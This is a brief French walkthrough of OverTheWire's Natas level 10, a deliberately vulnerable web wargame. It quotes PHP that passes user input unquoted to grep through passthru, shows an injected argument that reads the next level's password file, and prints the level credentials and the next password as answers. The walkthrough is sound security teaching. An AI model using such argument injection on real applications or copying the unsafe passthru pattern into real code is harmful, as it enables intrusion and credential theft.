## Connexion (username=natas10 password=EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv)
```
http://natas10.natas.labs.overthewire.org/
```

## Recherche du mot de passe

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```
Cette fois on a un filtre sur les caractères ```[;|&]``` mais la solution du niveau précédent fonctionne déjà.

grep -i ^ /etc/natas_webpass/natas11 dictionary.txt
## Prochain mot de passe
```
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```